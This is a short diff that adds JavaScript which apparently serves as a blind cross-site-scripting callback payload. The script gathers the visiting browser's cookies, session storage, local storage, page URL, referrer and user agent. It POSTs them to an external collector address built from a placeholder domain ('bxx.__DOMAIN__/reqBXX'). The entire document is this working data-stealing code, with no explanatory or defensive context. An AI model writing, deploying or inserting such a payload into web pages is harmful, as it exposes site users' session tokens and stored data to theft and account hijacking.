@@ -1,0 +1,10 @@
+    var mailer = "https://" + "bxx.__DOMAIN__" + "/reqBXX";
+
+    var msg = 'USER AGENT: ' + navigator.userAgent + '    TARGET URL: ' + document.URL;
+    msg += '    REFERRER URL: ' + document.referrer + '    READABLE COOKIES: ' + document.cookie;
+    msg += '    SESSION STORAGE: ' + JSON.stringify(sessionStorage) + '    LOCAL STORAGE: ' + JSON.stringify(localStorage);
+
+    var r = new XMLHttpRequest();
+    r.open('POST', mailer, true);
+    r.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
+    r.send('origin=' + document.location.origin + '&msg=' + encodeURIComponent(msg));
